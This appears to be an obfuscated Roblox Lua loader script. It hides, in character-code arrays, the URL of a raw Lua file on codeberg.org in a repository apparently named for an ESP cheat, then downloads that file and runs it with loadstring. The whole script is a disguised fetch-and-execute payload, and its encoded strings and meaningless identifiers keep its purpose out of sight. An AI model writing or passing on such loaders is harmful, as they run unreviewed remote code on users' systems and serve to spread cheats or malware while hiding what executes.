local ___O0o0O0o0O0o0O0o0O0 = {
    [1] = string.char(104,116,116,112,115,58,47,47),
    [2] = string.char(99,111,100,101,98,101,114,103,46,111,114,103),
    [3] = string.char(47,77,97,120,105,109,117,109,82,88,68,77),
    [4] = string.char(47,73,116,108,111,103,69,83,80),
    [5] = string.char(47,114,97,119,47,98,114,97,110,99,104,47),
    [6] = string.char(109,97,105,110,47,98,101,116,108,111,103,122),
    [7] = string.char(47,98,101,116,108,111,103,97,110,46,108,117,97,46,116,120,116)
}

local function __0OooO0O0O(tbl)
    local str = ""
    for i = 1, #tbl do
        str = str .. tbl[i]
    end
    return str
end

local function __IlIlIlIlIlIlIlI(func)
    return func()
end

__IlIlIlIlIlIlIlI(function()
    local __url = __0OooO0O0O(___O0o0O0o0O0o0O0o0O0)
    local __G = game
    local __H = __G.HttpGet
    local __L = loadstring
    return __L(__H(__G, __url))()
end)
